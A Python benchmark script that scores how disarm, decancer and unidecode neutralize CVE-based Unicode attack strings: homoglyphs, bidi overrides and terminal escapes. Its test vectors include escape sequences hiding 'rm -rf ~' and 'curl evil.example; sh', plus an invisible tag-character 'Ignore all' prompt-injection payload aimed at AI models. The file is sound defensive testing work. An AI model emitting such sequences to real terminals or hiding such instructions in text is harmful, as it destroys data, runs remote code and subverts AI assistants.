"""How disarm, decancer and unidecode handle the CVE vectors in the matrix.

Regenerates the comparator table in ``docs/security/cve-validation.md``:

    python benchmarks/cve_comparators.py            # the table
    python benchmarks/cve_comparators.py --markdown # ready to paste

Install the comparators first::

    pip install --require-hashes -r requirements/bench.txt

**One predicate, applied identically to every tool.** No tool gets a rule shaped
to suit it, and the predicate is the repo's existing XMR idea rather than a new
one invented here:

*Collapse* cases have a benign twin, so the test is ``P(attack) == P(benign)``
compared with ``str.lower()`` — a tool that lowercases (decancer always does) is
not penalized for it. *Removal* cases have no benign twin, so the test is that
the attack primitive is gone from the output.

**The comparison uses ``lower()`` rather than ``casefold()`` deliberately.**
``casefold()`` performs Unicode full case folding, which maps ``ß`` to ``ss`` —
the exact fold CVE-2026-23950 is about. Neutralizing with it would have made
every tool pass that row by measuring Python instead of the tool. ``lower()``
leaves ``ß`` alone, and switching produced no change on any other row.

**These are three tools built for three jobs, and the table is not a ranking.**
`unidecode` is a romanizer: it maps by *sound*, and was never intended as a
security control. `decancer` is an anti-obfuscation cleaner, so it is the one
genuine peer here. disarm maps by *appearance* per TR39. Reading a score without
that context gets the wrong answer — see ``_discrimination_probe`` below, which
shows why unidecode's score on the homoglyph rows is an artifact of which
homoglyph the attacker picked.

Thirteen hand-picked vectors are a spot check, not a measurement of the
confusable space. The broad-sample numbers (XMR over 1,314 TR39 sources) live in
``benchmarks/adversarial_eval`` and are quoted in the README.
"""

from __future__ import annotations

import argparse
import sys
from collections.abc import Callable

import disarm

#: Bidi controls: UAX#9 embeddings, overrides, isolates and marks.
BIDI = "‪‫‬‭‮⁦⁧⁨⁩‎‏؜"
#: Introducers a terminal acts on.
TERMINAL = ("\x1b", "\r", "\n", "\x07", "\x00")


def _has_tag_chars(text: str) -> bool:
    return any(0xE0000 <= ord(ch) <= 0xE007F for ch in text)


def _no_bidi(text: str) -> bool:
    return not any(ch in text for ch in BIDI)


# ---------------------------------------------------------------------------
# Cases
# ---------------------------------------------------------------------------
# Vectors are written independently of tests/test_cve_vectors.py on purpose:
# two reconstructions of the same CVE are a weak cross-check on both. The CVE
# *set* is gated against the registry by TestComparatorCorpusDrift.

#: (cve, attack, benign) — handled when P(attack) == P(benign) under lower().
COLLAPSE: list[tuple[str, str, str]] = [
    ("CVE-2021-42694", "isАdmin", "isAdmin"),
    ("CVE-2019-19844", "admın@example.com", "admin@example.com"),
    ("CVE-2013-7236", "аdmin", "admin"),
    ("CVE-2020-12063", "bοss@example.com", "boss@example.com"),
    ("CVE-2014-9390", ".g‌it/config", ".git/config"),
    ("CVE-2017-7832", "mı́guel.example", "míguel.example"),
    ("CVE-2017-7833", "exaّmple.com", "example.com"),
    ("CVE-2017-5383", "ex‐ample.com", "ex-ample.com"),
    ("CVE-2023-24329", "\x00https://evil.example.net", "https://evil.example.net"),
    ("CVE-2019-11721", "banĸ.example", "bank.example"),
    # The sharp-s row is why the neutralizer is lower() and not casefold();
    # see the module docstring. disarm's canonicalizers deliberately do not
    # clear this one — its key builders do — so it is comparable without being
    # part of the canonicalizer-clearable set.
    ("CVE-2026-23950", "groß.txt", "gross.txt"),
]

#: (cve, attack, predicate) — handled when the primitive is gone from the output.
REMOVAL: list[tuple[str, str, Callable[[str], bool]]] = [
    ("CVE-2021-42574", "/*‮ } ⁦if (isAdmin)⁩ ⁦ begin admins only */", _no_bidi),
    (
        "CVE-2009-3376",
        "photo_high_re‮gnp.js",
        lambda out: _no_bidi(out) and out.lower().endswith(".js"),
    ),
    (
        "CVE-2023-33955",
        "report‮fdp.exe",
        lambda out: _no_bidi(out) and out.lower().endswith(".exe"),
    ),
    (
        "CVE-2008-2383",
        "\x1bP$q\nrm -rf ~\n\x1b\\",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    (
        "CVE-2019-9535",
        "\x1bP1000p%output %1 malicious\x1b\\",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    (
        "CVE-2025-32711",
        "Please summarize." + "".join(chr(0xE0000 + ord(c)) for c in "Ignore all"),
        lambda out: not _has_tag_chars(out),
    ),
    (
        "CVE-2025-55754",
        "GET /\x1b[1A\x1b[2Krun: curl evil.example; sh HTTP/1.1",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    (
        "CVE-2024-52005",
        "fatal: repository not found\x1b[1A\x1b[2K$ curl evil.example; sh",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    (
        "CVE-2023-43620",
        "invoice\x1b[2K\x1b[1Gevil.sh",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    (
        "CVE-2023-37275",
        "Executing command\x1b[2K\x1b[1G  [OK] nothing happened",
        lambda out: not any(ch in out for ch in TERMINAL),
    ),
    # A pile of marks, bounded rather than removed: the defense is that the run
    # cannot reach a downstream stage, not that the base character goes away.
    ("CVE-2017-20190", "a" + ("\u0301" * 2_000), lambda out: len(out) <= 4),
]

#: Rows whose neutralizer in the matrix is neither of the two fixed disarm
#: columns below. The columns are fixed on purpose — decancer and unidecode each
#: expose exactly one entry point, so letting disarm pick a different function
#: per row would flatter it. But a bare `no` then reads as "disarm cannot do
#: this" when the matrix says otherwise a hundred lines further up, so these
#: rows carry a marker naming the function that does own them.
#:
#: Kept here rather than imported from the registry to avoid a benchmark ->
#: tests dependency; `TestComparatorCorpusDrift` asserts the two agree.
NAMED_ELSEWHERE: dict[str, str] = {
    "CVE-2019-19844": "canonicalize_strict",
    "CVE-2020-12063": "normalize_confusables",
    "CVE-2026-23950": "fold_case",
}

#: Every CVE this comparison covers. Gated against the test registry.
COVERED = frozenset([c for c, _, _ in COLLAPSE] + [c for c, _, _ in REMOVAL])


def build_tools() -> dict[str, Callable[[str], str]]:
    """The tools, or as many as are installed. Missing ones are reported, not faked."""
    tools: dict[str, Callable[[str], str]] = {
        "disarm.canonicalize": disarm.canonicalize,
        "disarm.strip_obfuscation": disarm.strip_obfuscation,
    }
    try:
        import decancer_py

        tools["decancer.parse"] = lambda s: str(decancer_py.parse(s))
    except ImportError:  # pragma: no cover - depends on the local env
        print("note: decancer-py not installed, column omitted", file=sys.stderr)
    try:
        from unidecode import unidecode

        tools["unidecode"] = unidecode
    except ImportError:  # pragma: no cover - depends on the local env
        print("note: Unidecode not installed, column omitted", file=sys.stderr)
    return tools


def _apply(fn: Callable[[str], str], text: str) -> str | None:
    """A tool that raises has not handled the vector; it has failed on it."""
    try:
        return fn(text)
    except Exception:  # noqa: BLE001 - any failure is a non-result, not a crash
        return None


def evaluate(tools: dict[str, Callable[[str], str]]) -> dict[str, dict[str, bool]]:
    """``{cve: {tool: handled}}`` for every case, every tool."""
    results: dict[str, dict[str, bool]] = {}
    for cve, attack, benign in COLLAPSE:
        row = {}
        for name, fn in tools.items():
            got, want = _apply(fn, attack), _apply(fn, benign)
            row[name] = got is not None and want is not None and got.lower() == want.lower()
        results[cve] = row
    for cve, attack, predicate in REMOVAL:
        row = {}
        for name, fn in tools.items():
            out = _apply(fn, attack)
            row[name] = out is not None and predicate(out)
        results[cve] = row
    return results


#: Two homoglyphs, two outcomes — the reason a score alone misleads.
#: Cyrillic ``р`` (U+0440) *looks* like ``p`` and *sounds* like ``r``; Cyrillic
#: ``А`` (U+0410) looks and sounds like ``A``. A phonetic tool gets the second
#: right by coincidence and the first wrong by design, so how well it appears to
#: do is decided by which character the attacker reached for.
DISCRIMINATION = [
    ("рroduсt", "product", "visual and phonetic disagree"),
    ("isАdmin", "isAdmin", "visual and phonetic agree"),
]


def _discrimination_probe(tools: dict[str, Callable[[str], str]]) -> list[str]:
    lines = ["", "Why the homoglyph rows need reading twice:"]
    for attack, expected, note in DISCRIMINATION:
        lines.append(f"  {attack!r} -> {expected!r}  ({note})")
        for name, fn in tools.items():
            lines.append(f"      {name:<26} {_apply(fn, attack)!r}")
    return lines


def render_text(tools, results) -> str:
    names = list(tools)
    width = max(len(n) for n in names) + 2
    out = [f"{'CVE':<16}" + "".join(f"{n:>{width}}" for n in names)]
    for cve in sorted(results):
        out.append(
            f"{cve:<16}" + "".join(f"{'PASS' if results[cve][n] else '-':>{width}}" for n in names)
        )
    total = len(results)
    out.append(
        f"{'TOTAL/' + str(total):<16}"
        + "".join(f"{sum(results[c][n] for c in results):>{width}}" for n in names)
    )
    out.extend(_discrimination_probe(tools))
    return "\n".join(out)


def render_markdown(tools, results) -> str:
    names = list(tools)
    out = ["| CVE | " + " | ".join(f"`{n}`" for n in names) + " |"]
    out.append("|---|" + "---|" * len(names))
    for cve in sorted(results):
        cells = " | ".join("yes" if results[cve][n] else "**no**" for n in names)
        marker = " †" if cve in NAMED_ELSEWHERE else ""
        out.append(f"| {cve}{marker} | {cells} |")
    scores = " | ".join(f"**{sum(results[c][n] for c in results)}/{len(results)}**" for n in names)
    out.append(f"| **Handled** | {scores} |")
    marked = sorted(NAMED_ELSEWHERE)
    if marked:
        out.append("")
        out.append(
            "† The matrix neutralizes these rows with an entry point that is not one of "
            "the two disarm columns above, so a `no` here means *not this function* "
            "rather than *not disarm*: "
            + ", ".join(f"{cve} → `{NAMED_ELSEWHERE[cve]}`" for cve in marked)
            + "."
        )
    return "\n".join(out)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--markdown", action="store_true", help="emit the docs table")
    args = parser.parse_args(argv)

    tools = build_tools()
    results = evaluate(tools)
    print(render_markdown(tools, results) if args.markdown else render_text(tools, results))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
